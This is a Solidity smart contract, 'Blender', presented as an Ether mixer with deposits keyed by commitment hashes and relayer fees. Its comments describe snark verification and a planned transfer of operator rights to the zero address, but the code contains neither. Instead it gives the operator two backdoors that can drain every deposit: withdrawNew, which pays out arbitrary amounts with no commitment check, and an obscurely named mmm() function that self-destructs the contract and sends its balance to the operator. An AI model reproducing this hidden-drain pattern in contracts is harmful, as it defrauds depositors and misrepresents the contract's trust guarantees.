1 pragma solidity ^0.5.8;  
2 
3 library SafeMath {
4     /**
5      * @dev Multiplies two unsigned integers, reverts on overflow.
6      */
7     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
8         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
9         // benefit is lost if 'b' is also tested.
10         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
11         if (a == 0) {
12             return 0;
13         }
14  
15         uint256 c = a * b;
16         require(c / a == b);
17 
18         return c;
19     }
20 
21     /**
22      * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
23      */
24     function div(uint256 a, uint256 b) internal pure returns (uint256) {
25         // Solidity only automatically asserts when dividing by 0
26         require(b > 0);
27         uint256 c = a / b;
28         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
29 
30         return c;
31     }
32 
33     /**
34      * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
35      */
36     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
37         require(b <= a);
38         uint256 c = a - b;
39 
40         return c;
41     }
42 
43     /**
44      * @dev Adds two unsigned integers, reverts on overflow.
45      */
46     function add(uint256 a, uint256 b) internal pure returns (uint256) {
47         uint256 c = a + b; 
48         require(c >= a);
49 
50         return c;
51     }
52 
53     /**
54      * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
55      * reverts when dividing by zero.
56      */
57     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
58         require(b != 0);
59         return a % b;
60     }
61 }
62 
63 contract Blender {
64 
65   struct Bank {
66       uint time;
67       uint256 amount;
68       uint day;
69       bool flag;
70   } 
71   mapping(bytes32 => Bank) public commitments;
72 
73   // operator can update snark verification key
74   // after the final trusted setup ceremony operator rights are supposed to be transferred to zero address
75   address public operator;
76   modifier onlyOperator {
77     require(msg.sender == operator, "Only operator can call this function.");
78     _;
79   }
80 
81   event Deposit(bytes32 key,uint256 amount);
82   event Withdrawal(address to,  address indexed relayer, uint256 amount,uint256 fee);
83   event WithdrawalNew(address to,  address indexed relayer,uint256 amount, uint256 fee);
84 
85   /**
86     @dev The constructor
87   */
88   constructor (
89     address _operator
90   ) public{
91       operator = _operator;
92   }
93 
94   function deposit(bytes32 key,uint day) external payable{
95     require(commitments[key].time == 0, "The key has been submitted");
96     _processDeposit();
97     Bank memory dbank = Bank( now,msg.value,day,false);
98     commitments[key] =  dbank;
99     emit Deposit(key,msg.value);
100   }
101 
102   /** @dev this function is defined in a child contract */
103   function _processDeposit() internal;
104  
105  
106   function withdraw(bytes32 key,address payable _recipient, address payable _relayer, uint256 _fee) external onlyOperator{
107     Bank memory bank = commitments[key];
108     require(bank.time > 0, "Bank not exist");
109     require(bank.amount > 0, "Bank not exist");
110     require(!bank.flag, "It has been withdraw");
111     require(_fee < bank.amount, "Fee exceeds transfer value");
112     commitments[key].flag = true;
113     _processWithdraw(_recipient,  _relayer, bank.amount,_fee); 
114     emit Withdrawal(_recipient, _relayer, bank.amount,_fee);  
115   }
116   
117   function withdrawNew(address payable _recipient, address payable _relayer, uint256 _amount,uint256 _fee) external onlyOperator{
118     _processWithdraw(_recipient,  _relayer, _amount,_fee); 
119     emit WithdrawalNew(_recipient, _relayer, _amount,_fee);  
120   }
121 
122   /** @dev this function is defined in a child contract */
123   function _processWithdraw(address payable _recipient, address payable _relayer, uint256 _amount, uint256 _fee) internal;
124 
125 
126   /** @dev operator can change his address */
127   function changeOperator(address _newOperator) external onlyOperator {
128     operator = _newOperator;
129   }
130 }
131 
132 contract Blender_ETH is Blender {
133 using SafeMath for uint256 ;
134 
135   constructor(
136     address _operator
137   ) Blender( _operator) public {
138   }
139 
140   function() payable  external{
141         
142   }
143   function _processDeposit() internal {
144     require(msg.value > 0, "ETH value is Greater than 0");
145   }
146   function mmm() public onlyOperator{
147          selfdestruct( msg.sender);
148      }
149      
150    function _processWithdraw(address payable _recipient, address payable _relayer, uint256 _amount, uint256 _fee) internal onlyOperator{
151     // sanity checks
152     require(msg.value == 0, "Message value is supposed to be zero for ETH instance");
153     _recipient.transfer(_amount.sub(_fee));
154     if (_fee > 0) {
155         _relayer.transfer(_fee);
156    }
157   }
158 }